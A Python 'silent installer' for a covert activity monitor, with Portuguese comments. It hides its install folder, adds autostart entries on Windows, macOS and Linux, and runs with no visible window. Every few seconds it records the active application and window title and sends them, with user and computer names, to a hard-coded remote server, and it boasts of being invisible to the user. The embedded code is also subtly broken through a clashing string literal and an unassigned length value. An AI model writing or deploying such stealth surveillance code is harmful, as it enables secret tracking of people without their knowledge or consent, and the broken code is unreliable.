#!/usr/bin/env python3
"""
Instalador Silencioso do Monitor Online
Instala e configura o agente para rodar em background sem interface
"""

import os
import sys
import platform
import subprocess
import shutil
import json
from pathlib import Path

class SilentInstaller:
    def __init__(self):
        self.system = platform.system()
        self.home_dir = Path.home()
        self.install_dir = self.home_dir / ".worktrack_monitor"
        self.server_url = "https://simple-monitor-online-kbgfqvu11-marcos10895s-projects.vercel.app"
        
    def install(self):
        """Instalar o monitor silenciosamente"""
        print("🔧 Instalando WorkTrack Monitor...")
        
        try:
            # 1. Criar diretório de instalação
            self.create_install_directory()
            
            # 2. Copiar arquivos
            self.copy_files()
            
            # 3. Instalar dependências
            self.install_dependencies()
            
            # 4. Configurar autostart
            self.setup_autostart()
            
            # 5. Iniciar serviço
            self.start_service()
            
            print("✅ Instalação concluída com sucesso!")
            print("📊 O monitor está rodando em background")
            print("🔒 Processo invisível ao usuário")
            
        except Exception as e:
            print(f"❌ Erro na instalação: {e}")
            return False
            
        return True
    
    def create_install_directory(self):
        """Criar diretório de instalação oculto"""
        self.install_dir.mkdir(exist_ok=True, parents=True)
        
        # Ocultar diretório no Windows
        if self.system == "Windows":
            subprocess.run(f'attrib +h "{self.install_dir}"', shell=True, capture_output=True)
    
    def copy_files(self):
        """Copiar arquivos do monitor"""
        script_dir = Path(__file__).parent.parent / "agent"
        monitor_file = script_dir / "monitor_online.py"
        
        if monitor_file.exists():
            shutil.copy2(monitor_file, self.install_dir / "monitor.py")
        else:
            # Criar arquivo do monitor se não existir
            self.create_monitor_file()
    
    def create_monitor_file(self):
        """Criar arquivo do monitor otimizado para background"""
        monitor_content = '''#!/usr/bin/env python3
"""
Monitor de Atividade - Versão Background
Executa silenciosamente sem interface
"""

import json
import time
import os
import sys
import subprocess
import requests
from datetime import datetime
import platform
import threading

class BackgroundMonitor:
    def __init__(self, server_url):
        self.server_url = server_url.rstrip('/')
        self.computer_id = self.get_computer_id()
        self.computer_name = self.get_computer_name()
        self.user_name = self.get_user_name()
        self.os_info = self.get_os_info()
        self.total_minutes = 0
        self.start_time = time.time()
        self.is_running = False
        
        # Log silencioso
        self.log_file = os.path.join(os.path.expanduser("~"), ".worktrack_monitor", "monitor.log")
        self.log(f"Monitor iniciado - {self.computer_name}")

    def log(self, message):
        """Log silencioso em arquivo"""
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] {message}\\n")
        except:
            pass

    def get_computer_id(self):
        try:
            if platform.system() == "Windows":
                computer_name = os.environ.get('COMPUTERNAME', 'unknown')
                user_name = os.environ.get('USERNAME', 'unknown')
            else:
                computer_name = platform.node()
                user_name = os.environ.get('USER', 'unknown')
            return f"{computer_name}-{user_name}".lower().replace(' ', '-')
        except:
            return f"unknown-{int(time.time())}"

    def get_computer_name(self):
        try:
            return platform.node() or "Computador Desconhecido"
        except:
            return "Computador Desconhecido"

    def get_user_name(self):
        try:
            return os.environ.get('USER') or os.environ.get('USERNAME') or "Usuário Desconhecido"
        except:
            return "Usuário Desconhecido"

    def get_os_info(self):
        try:
            return f"{platform.system()} {platform.release()}"
        except:
            return "Sistema Desconhecido"

    def get_active_window(self):
        try:
            if platform.system() == "Windows":
                import ctypes
                from ctypes import wintypes
                
                user32 = ctypes.windll.user32
                kernel32 = ctypes.windll.kernel32
                
                hwnd = user32.GetForegroundWindow()
                pid = wintypes.DWORD()
                user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                
                process_handle = kernel32.OpenProcess(0x0400 | 0x0010, False, pid)
                filename = ctypes.create_unicode_buffer(260)
                kernel32.GetModuleFileNameExW(process_handle, 0, filename, 260)
                kernel32.CloseHandle(process_handle)
                
                length = wintypes.DWORD()
                user32.GetWindowTextLengthW(hwnd)
                buffer = ctypes.create_unicode_buffer(length.value + 1)
                user32.GetWindowTextW(hwnd, buffer, length.value + 1)
                
                app_name = os.path.basename(filename.value) if filename.value else "Desconhecido"
                window_title = buffer.value if buffer.value else "Sem título"
                
                return {
                    'app': app_name,
                    'title': window_title
                }
                
            elif platform.system() == "Darwin":  # macOS
                script = '''
                tell application "System Events"
                    set frontApp to name of first application process whose frontmost is true
                    set frontAppTitle to ""
                    try
                        tell application frontApp
                            set frontAppTitle to name of front window
                        end try
                    end try
                    return frontApp & "|" & frontAppTitle
                end tell
                '''
                
                result = subprocess.run(['osascript', '-e', script], 
                                      capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0 and result.stdout.strip():
                    parts = result.stdout.strip().split('|', 1)
                    return {
                        'app': parts[0] if parts else "Desconhecido",
                        'title': parts[1] if len(parts) > 1 else "Sem título"
                    }
                    
            return {'app': 'Desconhecido', 'title': 'Sem título'}
            
        except Exception as e:
            self.log(f"Erro ao obter janela ativa: {e}")
            return {'app': 'Erro', 'title': 'Erro ao detectar'}

    def register_computer(self):
        try:
            data = {
                'type': 'register',
                'computer_id': self.computer_id,
                'computer_name': self.computer_name,
                'user_name': self.user_name,
                'os_info': self.os_info
            }
            
            response = requests.post(f'{self.server_url}/api/data', 
                                   json=data, timeout=10)
            
            if response.status_code == 200:
                self.log("Computador registrado com sucesso")
                return True
            else:
                self.log(f"Erro no registro: {response.status_code}")
                return False
                
        except Exception as e:
            self.log(f"Erro ao registrar: {e}")
            return False

    def send_activity(self, activity_data):
        try:
            response = requests.post(f'{self.server_url}/api/data', 
                                   json=activity_data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            self.log(f"Erro ao enviar atividade: {e}")
            return False

    def monitor_loop(self):
        self.is_running = True
        last_window = None
        last_activity_time = time.time()
        
        while self.is_running:
            try:
                current_window = self.get_active_window()
                current_time = time.time()
                
                elapsed_minutes = int((current_time - self.start_time) / 60)
                self.total_minutes = elapsed_minutes
                
                if current_window != last_window:
                    activity = f"Usando {current_window['app']}"
                    if current_window['title'] and current_window['title'] != "Sem título":
                        activity += f" - {current_window['title'][:50]}"
                    
                    activity_data = {
                        'type': 'activity',
                        'computer_id': self.computer_id,
                        'computer_name': self.computer_name,
                        'user_name': self.user_name,
                        'os_info': self.os_info,
                        'activity': activity,
                        'window': current_window['title'][:100],
                        'total_minutes': self.total_minutes,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    if self.send_activity(activity_data):
                        self.log(f"Atividade enviada: {activity}")
                    
                    last_window = current_window
                    last_activity_time = current_time
                
                time.sleep(5)  # Verificar a cada 5 segundos
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.log(f"Erro no loop: {e}")
                time.sleep(10)

    def start(self):
        self.log("Iniciando monitor em background")
        
        # Registrar computador
        if not self.register_computer():
            self.log("Falha no registro, continuando mesmo assim")
        
        # Iniciar monitoramento
        try:
            self.monitor_loop()
        except Exception as e:
            self.log(f"Erro crítico: {e}")
        finally:
            self.log("Monitor finalizado")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        server_url = sys.argv[1]
    else:
        server_url = "https://simple-monitor-online-kbgfqvu11-marcos10895s-projects.vercel.app"
    
    monitor = BackgroundMonitor(server_url)
    monitor.start()
'''
        
        with open(self.install_dir / "monitor.py", 'w', encoding='utf-8') as f:
            f.write(monitor_content)
    
    def install_dependencies(self):
        """Instalar dependências Python necessárias"""
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], 
                          capture_output=True, check=True)
            print("📦 Dependências instaladas")
        except Exception as e:
            print(f"⚠️ Aviso: Erro ao instalar dependências: {e}")
    
    def setup_autostart(self):
        """Configurar inicialização automática"""
        if self.system == "Windows":
            self.setup_windows_autostart()
        elif self.system == "Darwin":
            self.setup_macos_autostart()
        else:
            self.setup_linux_autostart()
    
    def setup_windows_autostart(self):
        """Configurar autostart no Windows via registro"""
        try:
            import winreg
            
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            script_path = self.install_dir / "monitor.py"
            command = f'"{sys.executable}" "{script_path}" "{self.server_url}"'
            
            winreg.SetValueEx(key, "WorkTrackMonitor", 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            
            print("🚀 Autostart configurado (Windows)")
            
        except Exception as e:
            print(f"⚠️ Erro ao configurar autostart: {e}")
    
    def setup_macos_autostart(self):
        """Configurar autostart no macOS via LaunchAgent"""
        try:
            launch_agents_dir = self.home_dir / "Library" / "LaunchAgents"
            launch_agents_dir.mkdir(exist_ok=True)
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.worktrack.monitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{self.install_dir}/monitor.py</string>
        <string>{self.server_url}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>{self.install_dir}/monitor.log</string>
    <key>StandardErrorPath</key>
    <string>{self.install_dir}/error.log</string>
</dict>
</plist>'''
            
            plist_file = launch_agents_dir / "com.worktrack.monitor.plist"
            with open(plist_file, 'w') as f:
                f.write(plist_content)
            
            # Carregar o LaunchAgent
            subprocess.run(['launchctl', 'load', str(plist_file)], 
                          capture_output=True)
            
            print("🚀 Autostart configurado (macOS)")
            
        except Exception as e:
            print(f"⚠️ Erro ao configurar autostart: {e}")
    
    def setup_linux_autostart(self):
        """Configurar autostart no Linux via systemd user service"""
        try:
            systemd_dir = self.home_dir / ".config" / "systemd" / "user"
            systemd_dir.mkdir(parents=True, exist_ok=True)
            
            service_content = f'''[Unit]
Description=WorkTrack Monitor
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {self.install_dir}/monitor.py {self.server_url}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target'''
            
            service_file = systemd_dir / "worktrack-monitor.service"
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Habilitar e iniciar serviço
            subprocess.run(['systemctl', '--user', 'daemon-reload'], 
                          capture_output=True)
            subprocess.run(['systemctl', '--user', 'enable', 'worktrack-monitor.service'], 
                          capture_output=True)
            
            print("🚀 Autostart configurado (Linux)")
            
        except Exception as e:
            print(f"⚠️ Erro ao configurar autostart: {e}")
    
    def start_service(self):
        """Iniciar o serviço imediatamente"""
        try:
            if self.system == "Windows":
                # Iniciar como processo em background
                script_path = self.install_dir / "monitor.py"
                subprocess.Popen([sys.executable, str(script_path), self.server_url],
                               creationflags=subprocess.CREATE_NO_WINDOW)
                               
            elif self.system == "Darwin":
                # Iniciar LaunchAgent
                plist_file = self.home_dir / "Library" / "LaunchAgents" / "com.worktrack.monitor.plist"
                subprocess.run(['launchctl', 'start', 'com.worktrack.monitor'], 
                              capture_output=True)
                              
            else:  # Linux
                subprocess.run(['systemctl', '--user', 'start', 'worktrack-monitor.service'], 
                              capture_output=True)
            
            print("▶️ Serviço iniciado")
            
        except Exception as e:
            print(f"⚠️ Erro ao iniciar serviço: {e}")

def main():
    print("🔧 WorkTrack Monitor - Instalador Silencioso")
    print("=" * 50)
    
    installer = SilentInstaller()
    
    if installer.install():
        print("\n✅ Instalação concluída!")
        print("📊 O monitor está agora rodando em background")
        print("🔒 Completamente invisível ao usuário")
        print("🚀 Iniciará automaticamente no boot")
        
        if installer.system == "Windows":
            print("\n💡 Para desinstalar: Execute como administrador e delete a chave do registro")
        elif installer.system == "Darwin":
            print(f"\n💡 Para desinstalar: launchctl unload ~/Library/LaunchAgents/com.worktrack.monitor.plist")
        else:
            print(f"\n💡 Para desinstalar: systemctl --user disable worktrack-monitor.service")
            
    else:
        print("\n❌ Falha na instalação!")
        sys.exit(1)

if __name__ == "__main__":
    main()
